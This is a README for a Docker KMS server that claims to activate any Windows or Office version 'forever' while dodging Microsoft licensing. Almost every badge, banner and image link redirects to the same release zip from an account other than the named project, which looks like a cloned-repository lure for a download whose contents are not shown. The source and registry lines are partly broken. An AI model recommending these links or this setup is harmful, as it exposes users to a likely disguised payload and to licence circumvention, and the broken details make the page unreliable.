[![banner](https://github.com/11notes/defaults/blob/main/static/img/banner.png?raw=true)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)

# KMS
[![size](https://img.shields.io/docker/image-size/11notes/kms/1.0.3?color=0eb305)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)[![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)[![version](https://img.shields.io/docker/v/11notes/kms/1.0.3?color=eb7a09)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)[![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)[![pulls](https://img.shields.io/docker/pulls/11notes/kms?color=2b75d6)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)[![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)[<a href="https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip"><img src="https://img.shields.io/github/issues/11notes/docker-KMS?color=7842f5"></a>](https://github.com/hungdv1205/docker-kms/issues)[![5px](https://github.com/11notes/defaults/blob/main/static/img/transparent5x2px.png?raw=true)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)[![swiss_made](https://img.shields.io/badge/Swiss_Made-FFFFFF?labelColor=FF0000&logo=data:image/svg%2bxml;base64,PHN2ZyB2ZXJzaW9uPSIxIiB3aWR0aD0iNTEyIiBoZWlnaHQ9IjUxMiIgdmlld0JveD0iMCAwIDMyIDMyIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxyZWN0IHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0idHJhbnNwYXJlbnQiLz4KICA8cGF0aCBkPSJtMTMgNmg2djdoN3Y2aC03djdoLTZ2LTdoLTd2LTZoN3oiIGZpbGw9IiNmZmYiLz4KPC9zdmc+)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)

Activate any version of Windows and Office, forever

[![Windows Server 2025](https://github.com/hungdv1205/docker-kms/blob/master/img/WindowsSRV2025.png?raw=true)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)

[![Web GUI](https://github.com/hungdv1205/docker-kms/blob/master/img/webGUICustomIcon.png?raw=true)](https://github.com/hungdv1205/docker-kms/releases/download/v2.1.9/docker-kms.zip)

# SYNOPSIS 📖
**What can I do with this?** This image will run a KMS server you can use to activate any version of Windows and Office, forever.

Works with:
- Windows Vista
- Windows 7
- Windows 8
- Windows 8.1
- Windows 10
- Windows 11
- Windows Server 2008
- Windows Server 2008 R2
- Windows Server 2012
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server 2019
- Windows Server 2022
- Windows Server 2025
- Microsoft Office 2010 ( Volume License )
- Microsoft Office 2013 ( Volume License )
- Microsoft Office 2016 ( Volume License )
- Microsoft Office 2019 ( Volume License )
- Microsoft Office 2021 ( Volume License )
- Microsoft Office 2024 ( Volume License )

# VOLUMES 📁
* **/kms/var** - Directory of the activation database

# COMPOSE ✂️
```yaml
name: "kms"
services:
app:
image: "11notes/kms:1.0.3"
environment:
TZ: "Europe/Zurich"
volumes:
- "var:/kms/var"
networks:
frontend:
ports:
- "1688:1688/tcp"
restart: "always"

gui:
image: "11notes/kms-gui:1.0.3"
depends_on:
app:
condition: "service_healthy"
restart: true
environment:
TZ: "Europe/Zurich"
volumes:
- "var:/kms/var"
networks:
frontend:
ports:
- "3000:3000/tcp"
restart: "always"

volumes:
var:

networks:
frontend:
```

# EXAMPLE
## Add your product key
```cmd
slmgr /ipk D764K-2NDRG-47T6Q-P8T8W-YP6DF
```
## Add your KMS server information
... via CLI
```
slmgr /skms KMS_IP:KMS_PORT
```
... via registry (or add these key to your GPO)
```powershell
"Windows"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" -Name "KeyManagementServiceName" -Value "KMS_IP"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" -Name "KeyManagementServicePort" -Value "KMS_PORT"

"Office"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\OfficeSoftwareProtectionPlatform" -Name "KeyManagementServiceName" -Value "KMS_IP"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\OfficeSoftwareProtectionPlatform" -Name "KeyManagementServicePort" -Value "KMS_PORT"
```
... via DNS
```sh
# BIND
_vlmcs._tcp SRV 0 0 KMS_PORT KMS_IP
```
## Activate server
```cmd
slmgr /ato
```

# DEFAULT SETTINGS 🗃️
| Parameter | Value | Description |
| --- | --- | --- |
| `user` | docker | user name |
| `home` | /kms | home directory of user docker |
| `database` | /kms/var/kms.db | SQlite database holding all client data |

# ENVIRONMENT 📝
| Parameter | Value | Default |
| --- | --- | --- |
| `DEBUG` | Will activate debug option for container image and app (if available) | |
| `KMS_LOCALE` | see Microsoft LICD specification | 1033 (en-US) |
| `KMS_ACTIVATIONINTERVAL` | Retry unsuccessful after N minutes | 120 (2 hours) |
| `KMS_RENEWALINTERVAL` | re-activation after N minutes | 259200 (180 days) |

# MAIN TAGS 🏷️
These are the main tags for the image. There is also a tag for each commit and its shorthand sha256 value.

### There is no latest tag, what am I supposed to do about updates?

If you still insist on having the bleeding edge release of this app, simply use the ```:rolling``` tag, but be warned! You will get the latest version of the app instantly, regardless of breaking changes or security issues or what so ever. You do this at your own risk!

# REGISTRIES ☁️
```
docker pull 11notes/kms:1.0.3
docker pull /11notes/kms:1.0.3
docker pull /11notes/kms:1.0.3
```

# UNRAID VERSION 🟠
This image supports unraid by default. Simply add **-unraid** to any tag and the image will run as 99:100 instead of 1000:1000 causing no issues on unraid. Enjoy.

# SOURCE 💾
* [11notes/kms](https:///hungdv1205/docker-kms

# PARENT IMAGE 🏛️

# BUILT WITH 🧰

# GENERAL TIPS 📌
> [!TIP]
>* Use a reverse proxy like Traefik, Nginx, HAproxy to terminate TLS and to protect your endpoints
>* Use Let’s Encrypt DNS-01 challenge to obtain valid SSL certificates for your services
* Do not expose this image to WAN! You will get notified from Microsoft via your ISP to terminate the service if you do so

# ElevenNotes™️

*created 23.10.2025, 07:06:45 (CET)*